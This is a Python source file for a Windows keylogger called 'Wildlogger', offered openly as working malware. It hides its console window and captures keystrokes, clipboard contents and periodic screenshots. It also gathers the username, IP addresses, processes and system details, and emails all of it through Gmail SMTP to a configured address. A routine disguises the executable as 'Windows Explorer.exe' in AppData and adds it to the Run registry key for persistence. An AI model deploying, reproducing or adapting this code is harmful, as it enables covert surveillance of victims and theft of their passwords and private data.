try:
    import win32gui, win32con, win32api
    minimize = win32gui.FindWindow(None, win32api.GetConsoleTitle())
    win32gui.ShowWindow(minimize , win32con.SW_HIDE)
except:
    pass

from pynput import keyboard
import threading
import datetime
import pyautogui
import os, tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import clipboard
import requests
import socket
import wmi
import shutil
import sys
import subprocess


class Wildlogger:
    def __init__(self,text_interval,screenshot_interval,from_email,password,to_email):
        # self.persistent()
        self.log = ""
        self.text_interval=text_interval
        self.screenshot_interval=screenshot_interval
        self.from_email=from_email
        self.password=password
        self.to_email=to_email
        self.pictures=[]
        self.mail=MIMEMultipart()
        self.c = wmi.WMI()
        self.status=1
        self.user=""
        self.current_key_list=set()

    def persistent(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run StartUp /t REG_CZ /d "'+evil_file_location+'"',shell=True)


    def connectionInfo(self):
        self.user = os.path.expanduser('~').split('\\')[2]
        dt = datetime.datetime.now().strftime("%d-%m-%Y %H")+":**"
        publicIP=""
        try:
            publicIP = requests.get('https://api.ipify.org/').text
        except:
            print("[-] Unable to connect to https://api.ipify.org !")
        privateIP = socket.gethostbyname(socket.gethostname())
        return """
          <h3>[+] Datetime:<span style="color:red;">""" + dt + """</span></h3>
          <h3>[+] Username:<span style="color:red;">""" + self.user + """</span></h3>
          <h3>[+] Public IP:<span style="color:red;">""" + publicIP + """</span></h3>
          <h3>[+] Private IP:<span style="color:red;">""" + privateIP + """</span></h3>
        """


    def runningProcesses(self):
        try:
            running = ""
            for process in self.c.Win32_Process():
                if process.Name not in running:
                    running = running + "<h3>" + process.Name + "<h3>"
            if running is not None:
                return running
        except Exception:
            pass


    def nonRunningServices(self):
        services = ""
        try:
            stopped_services = self.c.Win32_Service(StartMode="Auto", State="Stopped")
            if stopped_services:
                for s in stopped_services:
                    services = services + "<h3>" + s.Caption + "<h3>"
            else:
                services = "<h3>No auto services stopped<h3>"
            if services is not None:
                return services
        except Exception:
            pass


    def AboutComputerSystem(self):
        try:
            result = str(self.c.Win32_ComputerSystem()[0])
            result = result.replace(";", ";<br>").replace("instance of Win32_ComputerSystem","<b>INSTANCE OF WIN32_COMPUTERSYSTEM</b><br>").replace("}","").replace("{", "")
            if result is not None:
                return result
        except Exception:
            pass


    def victimInfo(self):
        return """
                <!DOCTYPE html>
                <html lang="en">
                <head>
                  <meta charset="UTF-8">
                  <title>Document</title>
                </head>
                <body>
                  <h2 align="center">Keylogger Started!</h2>
                  <hr>
                  <h2 align="center">[+] Connection İnformation</h2>
                   <b>
                   """+str( self.connectionInfo()) +"""
                   <b/>
                   <hr>
                </body>
                </html>
                """

    def takeScreenshot(self):
        picture={}
        currentDT = datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
        currentDT=currentDT.replace(" ","-").replace(".","-").replace(":","-")
        filename=currentDT+".jpg"
        temp_path = tempfile.gettempdir()
        save_path =temp_path+"\\"+filename
        pic = pyautogui.screenshot()
        pic.save(save_path)
        picture["filename"]=filename
        picture["path"]=save_path
        self.pictures.append(picture)
        if len(self.pictures)==10:
            self.report(2)
        screenshot_timer=threading.Timer(self.screenshot_interval,self.takeScreenshot)
        screenshot_timer.start()


    def prepareScreenshots(self):
        for file in self.pictures:
            img = open(file["path"], "rb").read()
            attachment = MIMEImage(img, name=file["filename"])
            self.deleteScreenshot(file["path"])
            self.mail.attach(attachment)

    def append_to_log(self,text):
        if "Clipboard" in text:
            text = text.replace('***\nc', '***\n')
            text = text.replace('***\nv', '***\n')
        self.log=self.log+text

    def delete_to_log(self):
        self.log=self.log[:-1]

    def deleteScreenshot(self,file):
        os.remove(file)

    def on_press(self,key):
        current_key=""
        if any([key in COMBO for COMBO in self.COMBINATIONS]):
            self.current_key_list.add(key)
            if any(all(k in self.current_key_list for k in COMBO) for COMBO in self.COMBINATIONS):
                current_key += "\n*** Start Clipboard ***\n"
                current_key += clipboard.paste()
                current_key += "\n*** End Clipboard ***\n"
        if key==keyboard.Key.enter:
            current_key+="\n"
        elif key==keyboard.Key.space:
            current_key+=" "
        elif key==keyboard.Key.backspace:
            self.delete_to_log()
        else:
            try:
                current_key+=key.char
            except:
                pass
        self.append_to_log(current_key)


    def on_release(self,key):
        if any([key in COMBO for COMBO in self.COMBINATIONS]):
            self.current_key_list.remove(key)

    def report(self,condition=1):
        if condition==1:
            self.sendMail(self.from_email,self.password,self.to_email,"\n\n"+self.log)
            self.log=""
            report_timer=threading.Timer(self.text_interval,self.report)
            report_timer.start()
        elif condition==2:
            self.prepareScreenshots()
            self.sendMail(self.from_email,self.password,self.to_email)
            self.pictures=[]
        elif condition==3:
            self.sendMail(self.from_email, self.password, self.to_email)
            report_timer = threading.Timer(self.text_interval, self.report)
            report_timer.start()
        self.mail=MIMEMultipart()

    def sendMail(self,from_email, parola,to_email, log=""):
        try:
            if log!="":
                self.mail.attach(MIMEText(log, "plain"))
            if self.status:
                self.status = 0
                self.mail.attach(MIMEText(self.victimInfo(),"html"))
            self.mail["Subject"] = "Keylogger Log Records  From " + self.user+" ~ "+datetime.datetime.now().strftime("%d-%m-%Y %H")+":**"
            self.mail["From"] = from_email
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(from_email, parola)
            server.sendmail(from_email, to_email, self.mail.as_string())
            server.quit()
        except smtplib.SMTPException:
            print("[-] Sending Mail Error!")
        except socket.gaierror:
            print("[-] Socket Gaierror")
        except:
            print("Sending Mail Error")
            pass

    def start(self):
        keyboard_listener=keyboard.Listener(on_press=self.on_press,on_release=self.on_release)
        with keyboard_listener:
            self.takeScreenshot()
            self.report(3)
            keyboard_listener.join()


try:
    interval_for_log=60000
    interval_for_Screenshot=60000
    Wildlogger = Wildlogger(interval_for_log, interval_for_Screenshot, "", "", "")
    Wildlogger.start()
except:
    pass